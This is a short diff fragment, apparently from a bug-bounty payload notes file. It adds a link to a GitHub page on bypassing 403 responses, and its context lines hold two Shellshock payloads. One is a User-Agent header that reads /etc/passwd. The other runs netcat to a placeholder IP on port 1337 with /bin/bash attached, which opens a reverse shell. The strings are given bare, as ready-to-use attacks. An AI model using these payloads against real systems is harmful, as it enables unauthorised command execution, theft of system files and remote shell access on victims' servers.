@@ -1,3 +1,5 @@
+https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass%20403.md
+
 User-Agent: () { :;}; echo $(</etc/passwd)
 () { :;}; /usr/bin/nc ip 1337 -e /bin/bash
 
